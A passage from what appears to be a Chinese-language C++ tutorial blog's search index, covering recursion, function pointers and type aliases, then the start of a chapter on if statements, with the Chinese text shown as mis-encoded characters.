â€¦ è¿™ä¸ªè¿‡ç¨‹ç»§ç»­ â€¦ countdown(1) æ‰“å° â€œ1â€¦â€ï¼Œç„¶åè°ƒç”¨ countdown(0)ã€‚ countdown(0) æ»¡è¶³åŸºçº¿æ¡ä»¶ (n &lt;= 0)ï¼Œæ‰“å° â€œBlastoff!â€ å¹¶è¿”å›ã€‚ countdown(1) è¿”å›ã€‚ countdown(2) è¿”å›ã€‚ â€¦ ä¾æ¬¡å›æº¯ â€¦ countdown(5) è¿”å›åˆ° mainã€‚ æ¯æ¬¡å‡½æ•°è°ƒç”¨éƒ½ä¼šåœ¨ç§°ä¸ºâ€œè°ƒç”¨æ ˆâ€çš„å†…å­˜åŒºåŸŸä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„è®°å½•ï¼ˆæ ˆå¸§ï¼‰ï¼Œç”¨äºå­˜å‚¨å‡½æ•°çš„å±€éƒ¨å˜é‡å’Œè¿”å›åœ°å€ã€‚å½“å‡½æ•°è¿”å›æ—¶ï¼Œå…¶æ ˆå¸§è¢«ç§»é™¤ã€‚ ç¤ºä¾‹ï¼šä½¿ç”¨é€’å½’è®¡ç®—é˜¶ä¹˜ é˜¶ä¹˜ n! å®šä¹‰ä¸º n * (n-1) * ... * 1ï¼Œå¹¶ä¸” 0! = 1ã€‚ 123456789101112131415161718192021#include &lt;iostream&gt;// é€’å½’å‡½æ•°ï¼šè®¡ç®— n çš„é˜¶ä¹˜unsigned long long factorial(int n) &#123; // åŸºçº¿æ¡ä»¶ï¼š0! = 1 if (n == 0) &#123; return 1; &#125; // é€’å½’æ­¥éª¤ï¼šn! = n * (n-1)! else &#123; return n * factorial(n - 1); // å‡½æ•°è°ƒç”¨è‡ªèº« &#125;&#125;int main() &#123; int num = 5; std::cout &lt;&lt; num &lt;&lt; &quot;! = &quot; &lt;&lt; factorial(num) &lt;&lt; std::endl; // è¾“å‡º: 5! = 120 num = 0; std::cout &lt;&lt; num &lt;&lt; &quot;! = &quot; &lt;&lt; factorial(num) &lt;&lt; std::endl; // è¾“å‡º: 0! = 1 return 0;&#125; 7.9.2 åŒ…å«å¤šä¸ªé€’å½’è°ƒç”¨çš„é€’å½’åœ¨è¿™ç§å½¢å¼ä¸­ï¼Œå‡½æ•°åœ¨ä¸€æ¬¡æ‰§è¡Œä¸­å¯èƒ½ä¼šè°ƒç”¨è‡ªèº«å¤šæ¬¡ã€‚è¿™é€šå¸¸ç”¨äºè§£å†³å¯ä»¥åˆ†è§£ä¸ºå¤šä¸ªç›¸åŒç±»å‹å­é—®é¢˜çš„é—®é¢˜ï¼Œä¾‹å¦‚æ ‘çš„éå†æˆ–æŸäº›æ•°å­¦åºåˆ—çš„è®¡ç®—ã€‚ ç¤ºä¾‹ï¼šä½¿ç”¨é€’å½’è®¡ç®—æ–æ³¢é‚£å¥‘æ•°åˆ— æ–æ³¢é‚£å¥‘æ•°åˆ—å®šä¹‰å¦‚ä¸‹ï¼šF(0) = 0, F(1) = 1, F(n) = F(n-1) + F(n-2) for n &gt; 1ã€‚ 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// é€’å½’å‡½æ•°ï¼šè®¡ç®—ç¬¬ n ä¸ªæ–æ³¢é‚£å¥‘æ•°unsigned long long fibonacci(int n) &#123; // åŸºçº¿æ¡ä»¶ if (n &lt;= 0) &#123; return 0; &#125; else if (n == 1) &#123; return 1; &#125; // é€’å½’æ­¥éª¤ï¼šF(n) = F(n-1) + F(n-2) else &#123; // å‡½æ•°è°ƒç”¨è‡ªèº«ä¸¤æ¬¡ return fibonacci(n - 1) + fibonacci(n - 2); &#125;&#125;int main() &#123; int term = 10; std::cout &lt;&lt; &quot;Fibonacci(&quot; &lt;&lt; term &lt;&lt; &quot;) = &quot; &lt;&lt; fibonacci(term) &lt;&lt; std::endl; // è¾“å‡º: Fibonacci(10) = 55 term = 6; std::cout &lt;&lt; &quot;Fibonacci(&quot; &lt;&lt; term &lt;&lt; &quot;) = &quot; &lt;&lt; fibonacci(term) &lt;&lt; std::endl; // è¾“å‡º: Fibonacci(6) = 8 return 0;&#125; å·¥ä½œåŸç†å’Œæ½œåœ¨é—®é¢˜: è®¡ç®— fibonacci(5) çš„è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š 12345678910fibonacci(5) -&gt; fibonacci(4) + fibonacci(3) -&gt; (fibonacci(3) + fibonacci(2)) + (fibonacci(2) + fibonacci(1)) -&gt; ((fibonacci(2) + fibonacci(1)) + (fibonacci(1) + fibonacci(0))) + ((fibonacci(1) + fibonacci(0)) + 1) -&gt; (((fibonacci(1) + fibonacci(0)) + 1) + (1 + 0)) + ((1 + 0) + 1) -&gt; (((1 + 0) + 1) + (1 + 0)) + ((1 + 0) + 1) -&gt; ((1 + 1) + 1) + (1 + 1) -&gt; (2 + 1) + 2 -&gt; 3 + 2 -&gt; 5 (æ³¨æ„ï¼šå®é™…è®¡ç®— fibonacci(10) ä¼šæ¶‰åŠæ›´å¤šå±‚è°ƒç”¨) è¿™ç§åŒ…å«å¤šä¸ªé€’å½’è°ƒç”¨çš„å®ç°æ–¹å¼ï¼ˆå¦‚æ­¤å¤„çš„æ–æ³¢é‚£å¥‘ï¼‰è™½ç„¶ç›´è§‚åœ°åæ˜ äº†æ•°å­¦å®šä¹‰ï¼Œä½†æ•ˆç‡å¯èƒ½éå¸¸ä½ã€‚ä¾‹å¦‚ï¼Œåœ¨è®¡ç®— fibonacci(5) æ—¶ï¼Œfibonacci(3) è¢«è®¡ç®—äº†ä¸¤æ¬¡ï¼Œfibonacci(2) è¢«è®¡ç®—äº†ä¸‰æ¬¡ã€‚éšç€ n çš„å¢å¤§ï¼Œé‡å¤è®¡ç®—çš„æ¬¡æ•°å‘ˆæŒ‡æ•°çº§å¢é•¿ã€‚ å¯¹äºè¿™ç±»é—®é¢˜ï¼Œè¿­ä»£ï¼ˆä½¿ç”¨å¾ªç¯ï¼‰æˆ–å…¶ä»–ä¼˜åŒ–æŠ€æœ¯ï¼ˆå¦‚è®°å¿†åŒ–ï¼Œå³å­˜å‚¨å·²è®¡ç®—çš„ç»“æœï¼‰é€šå¸¸æ˜¯æ›´é«˜æ•ˆçš„è§£å†³æ–¹æ¡ˆã€‚ é€’å½’çš„ä¼˜ç¼ºç‚¹: ä¼˜ç‚¹: å¯¹äºæŸäº›é—®é¢˜ï¼ˆå¦‚æ ‘éå†ã€åˆ†æ²»ç®—æ³•ï¼‰ï¼Œé€’å½’å¯ä»¥æä¾›éå¸¸è‡ªç„¶ã€ç®€æ´å’Œæ˜“äºç†è§£çš„è§£å†³æ–¹æ¡ˆã€‚ ä»£ç å¯ä»¥æ›´æ¥è¿‘é—®é¢˜çš„æ•°å­¦æˆ–é€»è¾‘æè¿°ã€‚ ç¼ºç‚¹: å¯èƒ½æ•ˆç‡ä½ä¸‹ï¼Œç‰¹åˆ«æ˜¯å½“å­˜åœ¨å¤§é‡é‡å¤è®¡ç®—æˆ–æ·±åº¦é€’å½’æ—¶ã€‚ æ¯æ¬¡å‡½æ•°è°ƒç”¨éƒ½æœ‰å¼€é”€ï¼ˆåˆ›å»ºæ ˆå¸§ï¼‰ï¼Œå¯èƒ½å¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚ æ·±åº¦é€’å½’å¯èƒ½è€—å°½è°ƒç”¨æ ˆç©ºé—´ï¼Œå¯¼è‡´æ ˆæº¢å‡ºé”™è¯¯ã€‚ è°ƒè¯•é€’å½’å‡½æ•°å¯èƒ½æ¯”è°ƒè¯•è¿­ä»£å‡½æ•°æ›´å›°éš¾ã€‚ åœ¨é€‰æ‹©ä½¿ç”¨é€’å½’è¿˜æ˜¯è¿­ä»£æ—¶ï¼Œéœ€è¦æƒè¡¡ä»£ç çš„æ¸…æ™°åº¦ã€ç®€æ´æ€§ä¸æ½œåœ¨çš„æ€§èƒ½å’Œå†…å­˜æ¶ˆè€—ã€‚ 7.10 å‡½æ•°æŒ‡é’ˆå°±åƒå˜é‡æœ‰åœ°å€ï¼Œå‡½æ•°ä¹Ÿæœ‰åœ°å€ã€‚å‡½æ•°æŒ‡é’ˆ (Function Pointer) å°±æ˜¯ä¸€ä¸ªæŒ‡å‘å‡½æ•°å†…å­˜åœ°å€çš„æŒ‡é’ˆå˜é‡ã€‚é€šè¿‡å‡½æ•°æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥åƒè°ƒç”¨æ™®é€šå‡½æ•°ä¸€æ ·è°ƒç”¨å®ƒæ‰€æŒ‡å‘çš„å‡½æ•°ã€‚å‡½æ•°æŒ‡é’ˆçš„ä¸»è¦ç”¨é€”åŒ…æ‹¬ï¼š å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ç»™å…¶ä»–å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œå®ç°å›è°ƒæœºåˆ¶æˆ–ç­–ç•¥æ¨¡å¼ï¼‰ã€‚ åœ¨è¿è¡Œæ—¶å†³å®šè°ƒç”¨å“ªä¸ªå‡½æ•°ã€‚ æ„å»ºå‡½æ•°è¡¨æˆ–è°ƒåº¦è¡¨ã€‚ 7.10.1 å‡½æ•°æŒ‡é’ˆçš„åŸºç¡€çŸ¥è¯†å£°æ˜å‡½æ•°æŒ‡é’ˆ: å£°æ˜å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œå¿…é¡»æŒ‡å®šå®ƒæ‰€æŒ‡å‘çš„å‡½æ•°çš„è¿”å›ç±»å‹å’Œå‚æ•°åˆ—è¡¨ç±»å‹ã€‚è¿™ç¡®ä¿äº†ç±»å‹å®‰å…¨ï¼Œå³å‡½æ•°æŒ‡é’ˆåªèƒ½æŒ‡å‘å…·æœ‰åŒ¹é…ç­¾åçš„å‡½æ•°ã€‚ è¯­æ³•: 1return_type (*pointer_name)(parameter_type_list); return_type: å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°çš„è¿”å›ç±»å‹ã€‚ pointer_name: å‡½æ•°æŒ‡é’ˆå˜é‡çš„åç§°ã€‚ parameter_type_list: å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°çš„å‚æ•°ç±»å‹åˆ—è¡¨ï¼Œç”¨é€—å·åˆ†éš”ã€‚ (*pointer_name): æ‹¬å·æ˜¯å¿…éœ€çš„ï¼Œå®ƒè¡¨æ˜ pointer_name æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚å¦‚æœæ²¡æœ‰æ‹¬å·ï¼Œreturn_type *pointer_name(parameter_type_list); ä¼šè¢«è§£é‡Šä¸ºä¸€ä¸ªè¿”å› return_type* ç±»å‹çš„å‡½æ•°å£°æ˜ã€‚ ç¤ºä¾‹å£°æ˜: 1234567891011// å£°æ˜ä¸€ä¸ªåä¸º func_ptr çš„å‡½æ•°æŒ‡é’ˆ// å®ƒæŒ‡å‘ä¸€ä¸ªæ¥å—ä¸¤ä¸ª int å‚æ•°å¹¶è¿”å› int çš„å‡½æ•°int (*func_ptr)(int, int);// å£°æ˜ä¸€ä¸ªåä¸º process çš„å‡½æ•°æŒ‡é’ˆ// å®ƒæŒ‡å‘ä¸€ä¸ªæ¥å— const char* å‚æ•°ä¸”æ— è¿”å›å€¼ (void) çš„å‡½æ•°void (*process)(const char*);// å£°æ˜ä¸€ä¸ªåä¸º compare çš„å‡½æ•°æŒ‡é’ˆ// å®ƒæŒ‡å‘ä¸€ä¸ªæ¥å—ä¸¤ä¸ª double å‚æ•°å¹¶è¿”å› bool çš„å‡½æ•°bool (*compare)(double, double); åˆå§‹åŒ–å‡½æ•°æŒ‡é’ˆ: å¯ä»¥å°†å‡½æ•°çš„åç§°ï¼ˆä¸å¸¦æ‹¬å·ï¼‰ç›´æ¥èµ‹ç»™å…·æœ‰åŒ¹é…ç­¾åçš„å‡½æ•°æŒ‡é’ˆã€‚å‡½æ•°åæœ¬èº«å°±ä»£è¡¨äº†å‡½æ•°çš„åœ°å€ã€‚ 12345678int add(int a, int b) &#123; return a + b; &#125;void print_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;// åˆå§‹åŒ– func_ptr æŒ‡å‘ add å‡½æ•°func_ptr = add; // æˆ–è€… func_ptr = &amp;add; (&amp; æ˜¯å¯é€‰çš„)// åˆå§‹åŒ– process æŒ‡å‘ print_message å‡½æ•°process = print_message; ä½¿ç”¨å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°: å¯ä»¥é€šè¿‡å‡½æ•°æŒ‡é’ˆæ¥è°ƒç”¨å®ƒæ‰€æŒ‡å‘çš„å‡½æ•°ï¼Œè¯­æ³•ä¸ç›´æ¥è°ƒç”¨å‡½æ•°ç±»ä¼¼ã€‚ 123456int result = func_ptr(5, 3); // è°ƒç”¨ add(5, 3)ï¼Œresult å°†æ˜¯ 8process(&quot;Hello via pointer!&quot;); // è°ƒç”¨ print_message(&quot;Hello via pointer!&quot;)// ä¹Ÿå¯ä»¥ä½¿ç”¨æ˜¾å¼è§£å¼•ç”¨è¯­æ³• (è¾ƒå°‘è§)// int result = (*func_ptr)(5, 3);// (*process)(&quot;Hello via pointer!&quot;); 7.10.2 å‡½æ•°æŒ‡é’ˆç¤ºä¾‹ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•å£°æ˜ã€åˆå§‹åŒ–å’Œä½¿ç”¨å‡½æ•°æŒ‡é’ˆã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;// ç›®æ ‡å‡½æ•° 1int add(int x, int y) &#123; return x + y;&#125;// ç›®æ ‡å‡½æ•° 2int subtract(int x, int y) &#123; return x - y;&#125;// ç›®æ ‡å‡½æ•° 3void display_result(int result) &#123; std::cout &lt;&lt; &quot;The result is: &quot; &lt;&lt; result &lt;&lt; std::endl;&#125;int main() &#123; // å£°æ˜ä¸€ä¸ªæŒ‡å‘æ¥å—ä¸¤ä¸ª int å¹¶è¿”å› int çš„å‡½æ•°çš„æŒ‡é’ˆ int (*operation)(int, int); // å£°æ˜ä¸€ä¸ªæŒ‡å‘æ¥å—ä¸€ä¸ª int ä¸”æ— è¿”å›å€¼çš„å‡½æ•°çš„æŒ‡é’ˆ void (*show)(int); // å°† operation æŒ‡å‘ add å‡½æ•° operation = add; std::cout &lt;&lt; &quot;Using &#x27;add&#x27; function via pointer:&quot; &lt;&lt; std::endl; int sum = operation(10, 5); // è°ƒç”¨ add(10, 5) std::cout &lt;&lt; &quot;10 + 5 = &quot; &lt;&lt; sum &lt;&lt; std::endl; // è¾“å‡º: 15 // å°† operation æŒ‡å‘ subtract å‡½æ•° operation = subtract; std::cout &lt;&lt; &quot;\\nUsing &#x27;subtract&#x27; function via pointer:&quot; &lt;&lt; std::endl; int diff = operation(10, 5); // è°ƒç”¨ subtract(10, 5) std::cout &lt;&lt; &quot;10 - 5 = &quot; &lt;&lt; diff &lt;&lt; std::endl; // è¾“å‡º: 5 // å°† show æŒ‡å‘ display_result å‡½æ•° show = display_result; std::cout &lt;&lt; &quot;\\nDisplaying difference using &#x27;show&#x27; pointer:&quot; &lt;&lt; std::endl; show(diff); // è°ƒç”¨ display_result(diff) return 0;&#125; 7.10.3 æ·±å…¥æ¢è®¨å‡½æ•°æŒ‡é’ˆå‡½æ•°æŒ‡é’ˆä½œä¸ºå‡½æ•°å‚æ•°: ä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯å°†å‡½æ•°æŒ‡é’ˆä½œä¸ºå‚æ•°ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°ã€‚è¿™å…è®¸è°ƒç”¨å‡½æ•°æ ¹æ®ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆæ¥å®šåˆ¶å…¶è¡Œä¸ºã€‚ 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;vector&gt;// å‡½æ•°ï¼šæ£€æŸ¥ä¸€ä¸ªæ•°å­—æ˜¯å¦ä¸ºå¶æ•°bool is_even(int n) &#123; return n % 2 == 0;&#125;// å‡½æ•°ï¼šæ£€æŸ¥ä¸€ä¸ªæ•°å­—æ˜¯å¦ä¸ºæ­£æ•°bool is_positive(int n) &#123; return n &gt; 0;&#125;// å‡½æ•°ï¼šæ‰“å°æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„æ•°å­—// å‚æ•°ï¼šä¸€ä¸ªæ•´æ•°å‘é‡ï¼Œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ (æŒ‡å‘æ£€æŸ¥æ¡ä»¶çš„å‡½æ•°)void print_numbers_if(const std::vector&lt;int&gt;&amp; numbers, bool (*check)(int)) &#123; std::cout &lt;&lt; &quot;Numbers satisfying the condition: &quot;; for (int num : numbers) &#123; if (check(num)) &#123; // ä½¿ç”¨ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆè°ƒç”¨æ£€æŸ¥å‡½æ•° std::cout &lt;&lt; num &lt;&lt; &quot; &quot;; &#125; &#125; std::cout &lt;&lt; std::endl;&#125;int main() &#123; std::vector&lt;int&gt; data = &#123;1, -2, 3, 4, -5, 6&#125;; std::cout &lt;&lt; &quot;Checking for even numbers:&quot; &lt;&lt; std::endl; print_numbers_if(data, is_even); // ä¼ é€’ is_even å‡½æ•°çš„åœ°å€ std::cout &lt;&lt; &quot;\\nChecking for positive numbers:&quot; &lt;&lt; std::endl; print_numbers_if(data, is_positive); // ä¼ é€’ is_positive å‡½æ•°çš„åœ°å€ return 0;&#125; è¾“å‡º: 1234Checking for even numbers:Numbers satisfying the condition: -2 4 6Checking for positive numbers:Numbers satisfying the condition: 1 3 4 6 åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œprint_numbers_if å‡½æ•°çš„è¡Œä¸ºç”±ä¼ é€’ç»™å®ƒçš„ check å‡½æ•°æŒ‡é’ˆå†³å®šã€‚ 7.10.4 ä½¿ç”¨ typedef æˆ– using è¿›è¡Œç®€åŒ–å‡½æ•°æŒ‡é’ˆçš„å£°æ˜è¯­æ³•å¯èƒ½æ¯”è¾ƒå†—é•¿å’Œå¤æ‚ã€‚å¯ä»¥ä½¿ç”¨ typedef (ä¼ ç»Ÿæ–¹å¼) æˆ– using (C++11 åŠä»¥åæ¨è) æ¥åˆ›å»ºå‡½æ•°æŒ‡é’ˆç±»å‹çš„åˆ«åï¼Œä½¿ä»£ç æ›´æ¸…æ™°ã€‚ ä½¿ç”¨ typedef: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// ä½¿ç”¨ typedef å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹åˆ«åtypedef bool (*CheckFunction)(int); // CheckFunction æ˜¯æŒ‡å‘ (int) -&gt; bool å‡½æ•°çš„æŒ‡é’ˆç±»å‹typedef void (*DisplayFunction)(const char*);void print_if(int val, CheckFunction check, DisplayFunction display) &#123; if (check(val)) &#123; display(&quot;Condition met!&quot;); &#125; else &#123; display(&quot;Condition not met.&quot;); &#125;&#125;bool is_negative(int n) &#123; return n &lt; 0; &#125;void show_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;int main() &#123; CheckFunction checker = is_negative; // ä½¿ç”¨åˆ«åå£°æ˜å’Œåˆå§‹åŒ– DisplayFunction printer = show_message; print_if(-5, checker, printer); // è¾“å‡º: Condition met! print_if(10, checker, printer); // è¾“å‡º: Condition not met. return 0;&#125; ä½¿ç”¨ using (C++11): using æä¾›äº†æ›´ç›´è§‚ã€æ›´ä¸€è‡´çš„åˆ«åè¯­æ³•ã€‚ 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;// ä½¿ç”¨ using å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹åˆ«å (æ¨è)using CheckFunction = bool (*)(int); // æŒ‡å‘ (int) -&gt; bool å‡½æ•°çš„æŒ‡é’ˆç±»å‹using DisplayFunction = void (*)(const char*);// ... (å‡½æ•° print_if, is_negative, show_message å’Œ main å‡½æ•°åŒä¸Š) ...void print_if(int val, CheckFunction check, DisplayFunction display) &#123; if (check(val)) &#123; display(&quot;Condition met!&quot;); &#125; else &#123; display(&quot;Condition not met.&quot;); &#125;&#125;bool is_negative(int n) &#123; return n &lt; 0; &#125;void show_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;int main() &#123; CheckFunction checker = is_negative; DisplayFunction printer = show_message; print_if(-5, checker, printer); print_if(10, checker, printer); return 0;&#125; ä½¿ç”¨ç±»å‹åˆ«åå¯ä»¥æ˜¾è‘—æé«˜æ¶‰åŠå‡½æ•°æŒ‡é’ˆçš„ä»£ç çš„å¯è¯»æ€§ã€‚ æ€»ç»“: å‡½æ•°æŒ‡é’ˆæ˜¯ C++ ä¸­ä¸€ä¸ªå¼ºå¤§çš„ç‰¹æ€§ï¼Œå®ƒå…è®¸å°†å‡½æ•°è§†ä¸ºæ•°æ®è¿›è¡Œä¼ é€’å’Œå­˜å‚¨ã€‚è™½ç„¶è¯­æ³•å¯èƒ½åˆçœ‹èµ·æ¥æœ‰äº›å¤æ‚ï¼Œä½†é€šè¿‡ typedef æˆ– using å¯ä»¥ç®€åŒ–ã€‚ç†è§£å‡½æ•°æŒ‡é’ˆå¯¹äºæŒæ¡å›è°ƒæœºåˆ¶ã€æŸäº›è®¾è®¡æ¨¡å¼ä»¥åŠä¸ C åº“äº¤äº’éå¸¸é‡è¦ã€‚åœ¨ç°ä»£ C++ ä¸­ï¼Œå‡½æ•°å¯¹è±¡ï¼ˆFunctorsï¼‰å’Œ Lambda è¡¨è¾¾å¼ï¼ˆå°†åœ¨åç»­ç« èŠ‚ä»‹ç»ï¼‰æä¾›äº†æ›´çµæ´»ã€æœ‰æ—¶æ›´æ–¹ä¾¿çš„æ›¿ä»£æ–¹æ¡ˆï¼Œä½†å‡½æ•°æŒ‡é’ˆä»ç„¶æœ‰å…¶ç”¨æ­¦ä¹‹åœ°ã€‚ 7.11 æ€»ç»“æœ¬ç« æ·±å…¥æ¢è®¨äº†å‡½æ•°è¿™ä¸€ C++ ç¼–ç¨‹çš„åŸºæœ¬æ¨¡å—ï¼Œæ¶µç›–äº†å‡½æ•°å®šä¹‰ã€è°ƒç”¨ã€å‚æ•°ä¼ é€’æœºåˆ¶ä»¥åŠå¦‚ä½•å°†å‡½æ•°ä¸å„ç§æ•°æ®ç±»å‹ï¼ˆæ•°ç»„ã€å­—ç¬¦ä¸²ã€ç»“æ„ã€å¯¹è±¡ï¼‰ç»“åˆä½¿ç”¨ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š å‡½æ•°åŸºç¡€: å¤ä¹ äº†å‡½æ•°çš„å®šä¹‰ï¼ˆè¿”å›ç±»å‹ã€åç§°ã€å‚æ•°åˆ—è¡¨ã€å‡½æ•°ä½“ï¼‰ã€å‡½æ•°åŸå‹ï¼ˆå£°æ˜å‡½æ•°æ¥å£ä»¥ä¾›ç¼–è¯‘å™¨ä½¿ç”¨ï¼‰å’Œå‡½æ•°è°ƒç”¨ï¼ˆæ‰§è¡Œå‡½æ•°ä»£ç ï¼‰ã€‚ å‚æ•°ä¼ é€’: æŒ‰å€¼ä¼ é€’ (Pass by Value): C++ çš„é»˜è®¤æ–¹å¼ï¼Œé€‚ç”¨äºåŸºæœ¬ç±»å‹ã€ç»“æ„å’Œç±»å¯¹è±¡ã€‚å‡½æ•°æ“ä½œçš„æ˜¯å®å‚çš„å‰¯æœ¬ï¼Œä¸å½±å“åŸå§‹æ•°æ®ï¼Œä½†å¯èƒ½å› å¤åˆ¶å¤§å‹å¯¹è±¡è€Œæ•ˆç‡ä½ä¸‹ã€‚ æ•°ç»„ä¼ é€’: C é£æ ¼æ•°ç»„ä¼ é€’æ—¶ä¼šé€€åŒ–ä¸ºæŒ‡å‘é¦–å…ƒç´ çš„æŒ‡é’ˆï¼Œå‡½æ•°ç›´æ¥æ“ä½œåŸå§‹æ•°ç»„ï¼Œæ•ˆç‡é«˜ä½†ä¸¢å¤±å¤§å°ä¿¡æ¯ï¼Œéœ€é¢å¤–ä¼ é€’å¤§å°æˆ–ä½¿ç”¨æŒ‡é’ˆåŒºé—´ã€‚const å¯ç”¨äºä¿æŠ¤æ•°ç»„å†…å®¹ã€‚ äºŒç»´æ•°ç»„ä¼ é€’: å¿…é¡»åœ¨å‡½æ•°å‚æ•°ä¸­æŒ‡å®šé™¤ç¬¬ä¸€ç»´ä¹‹å¤–çš„æ‰€æœ‰ç»´åº¦çš„å¤§å°ã€‚ ç»“æ„ä¼ é€’: é»˜è®¤æŒ‰å€¼ä¼ é€’ã€‚ä¸ºæé«˜æ•ˆç‡æˆ–å…è®¸ä¿®æ”¹ï¼Œå¯ä¼ é€’ç»“æ„æŒ‡é’ˆ (struct_type*)ï¼Œä½¿ç”¨ -&gt; è®¿é—®æˆå‘˜ï¼Œæˆ–ä½¿ç”¨å¼•ç”¨ï¼ˆç¬¬ 8 ç« å†…å®¹ï¼‰ã€‚ std::string å’Œ std::array å¯¹è±¡ä¼ é€’: é»˜è®¤æŒ‰å€¼ä¼ é€’ï¼Œä½†é€šå¸¸æ¨èæŒ‰å¸¸é‡å¼•ç”¨ (const T&amp;) ä¼ é€’ä»¥è·å¾—æ•ˆç‡å’Œå®‰å…¨æ€§ï¼Œæˆ–æŒ‰å¼•ç”¨ (T&amp;) ä¼ é€’ä»¥å…è®¸ä¿®æ”¹ã€‚ å‡½æ•°ä¸ç‰¹å®šç±»å‹: C-é£æ ¼å­—ç¬¦ä¸²: ä½œä¸º char* ä¼ é€’ï¼Œä¾èµ– \\0 ç»“æŸç¬¦ã€‚è¿”å› C é£æ ¼å­—ç¬¦ä¸²æ¯”è¾ƒå¤æ‚ï¼Œæ¨èè®©è°ƒç”¨è€…æä¾›ç¼“å†²åŒºã€‚ std::string å¯¹è±¡: ä½¿ç”¨ const std::string&amp; ä¼ é€’æ˜¯å¸¸ç”¨æ–¹å¼ã€‚è¿”å› std::string é€šå¸¸å›  RVO/NRVO è€Œé«˜æ•ˆã€‚ std::array å¯¹è±¡: è¡Œä¸ºç±»ä¼¼ç»“æ„ï¼Œå¤§å°æ˜¯ç±»å‹çš„ä¸€éƒ¨åˆ†ã€‚æ¨èä½¿ç”¨ const std::array&lt;T, N&gt;&amp; ä¼ é€’ã€‚ é€’å½’: å‡½æ•°è°ƒç”¨è‡ªèº«æ¥è§£å†³é—®é¢˜ã€‚éœ€è¦æ˜ç¡®çš„åŸºçº¿æ¡ä»¶æ¥åœæ­¢é€’å½’ï¼Œä»¥åŠä½¿é—®é¢˜è§„æ¨¡ç¼©å°çš„é€’å½’æ­¥éª¤ã€‚é€’å½’å¯ä»¥ä½¿æŸäº›é—®é¢˜çš„ä»£ç ç®€æ´ï¼Œä½†å¯èƒ½æ•ˆç‡ä½æˆ–å¯¼è‡´æ ˆæº¢å‡ºã€‚ å‡½æ•°æŒ‡é’ˆ: æŒ‡å‘å‡½æ•°åœ°å€çš„æŒ‡é’ˆå˜é‡ã€‚å…è®¸å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ã€åœ¨è¿è¡Œæ—¶é€‰æ‹©å‡½æ•°ç­‰ã€‚å£°æ˜æ—¶éœ€åŒ¹é…å‡½æ•°ç­¾åï¼ˆè¿”å›ç±»å‹å’Œå‚æ•°ç±»å‹ï¼‰ã€‚typedef æˆ– using å¯ç®€åŒ–å…¶å£°æ˜ã€‚ é€šè¿‡æœ¬ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æŒæ¡äº†å¦‚ä½•æœ‰æ•ˆåœ°å®šä¹‰å’Œä½¿ç”¨å‡½æ•°æ¥æ„å»ºæ¨¡å—åŒ–ã€å¯é‡ç”¨å’Œå¯ç»´æŠ¤çš„ C++ ç¨‹åºï¼Œå¹¶äº†è§£äº†ä¸åŒæ•°æ®ç±»å‹åœ¨å‡½æ•°å‚æ•°ä¼ é€’ä¸­çš„è¡Œä¸ºå’Œæœ€ä½³å®è·µã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 6 åˆ†æ”¯è¯­å¥å’Œé€»è¾‘è¿ç®—ç¬¦","slug":"Cpp_tutorial_Chapter_6","date":"2025-04-26T12:03:35.379Z","updated":"2025-04-26T12:01:50.496Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_6/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_6/","excerpt":"","text":"6.1 ifè¯­å¥åˆ†æ”¯è¯­å¥å…è®¸ç¨‹åºæ ¹æ®ç‰¹å®šæ¡ä»¶é€‰æ‹©æ‰§è¡Œä¸åŒçš„ä»£ç è·¯å¾„ã€‚if è¯­å¥æ˜¯ C++ ä¸­æœ€åŸºæœ¬çš„åˆ†æ”¯ç»“æ„ï¼Œå®ƒå…è®¸ç¨‹åºæ ¹æ®ä¸€ä¸ªæ¡ä»¶è¡¨è¾¾å¼ (Condition) çš„çœŸå‡æ¥å†³å®šæ˜¯å¦æ‰§è¡ŒæŸæ®µä»£ç ã€‚ åŸºæœ¬è¯­æ³•: 123456789if (condition) &#123; // å¦‚æœ condition ä¸º trueï¼Œåˆ™æ‰§è¡Œè¿™é‡Œçš„è¯­å¥ statement1; statement2; // ...&#125;// æˆ–è€…å¦‚æœåªæœ‰ä¸€æ¡è¯­å¥if (condition) single_statement; condition: ä¸€ä¸ªæ±‚å€¼ä¸ºå¸ƒå°”å€¼ (true æˆ– false) çš„è¡¨è¾¾å¼ã€‚é€šå¸¸æ˜¯å…³ç³»è¡¨è¾¾å¼ï¼ˆå¦‚ x 